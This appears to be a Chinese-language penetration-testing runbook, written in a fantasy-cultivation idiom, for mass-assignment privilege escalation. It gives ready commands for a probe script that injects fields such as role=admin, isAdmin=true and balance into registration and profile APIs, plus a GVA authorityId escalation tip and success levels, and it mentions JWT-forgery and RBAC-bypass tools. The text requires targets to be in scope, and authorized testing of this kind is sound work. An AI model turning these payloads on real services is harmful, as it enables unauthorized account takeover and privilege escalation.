# 大爱仙尊批量赋值作业手法

> 杀招：`群赋`  
> 工具：`python3 炼蛊房/param_abuse_probe.py mass`  
> JWT claim：`jwt_forge_probe.py`；角色接口：`rbac_bypass_probe.py`

目标须在 scope。改余额/改超管先问。注册接口优先打。

---

## 1. 立刻跑

```bash
python3 炼蛊房/param_abuse_probe.py mass --url https://授权/api/register \
  --base '{"username":"se1","password":"Se1!se"}' --extra role=admin --extra isAdmin=true --case <案>
python3 炼蛊房/param_abuse_probe.py mass --url https://授权/api/user \
  --base '{"name":"se"}' --extra role=admin --header 'Authorization: Bearer <票>' --case <案>
```

产物：`案卷/param_abuse/mass.json`。

---

## 2. 四刀

1. **找绑定** — 注册 / 更新资料 / PATCH 自己  
2. **加隐藏字段** — `role` `isAdmin` `verified` `balance` `authorityId`  
3. **回读** — `/me` 或响应里回显 extra 才算  
4. **对照** — 不带 extra 的基线没有该字段。GVA `authorityId` 切静默提权卡

Swagger 里的字段名比猜强。Mass 不是 JWT 伪造。

---

## 3. 档位

| 档 | 成立 |
|----|------|
| L1 | 接口吃未知字段不报错 |
| L2 | `/me` 或响应出现注入字段 |
| L3 | 管理接口 200（只读证明即可） |
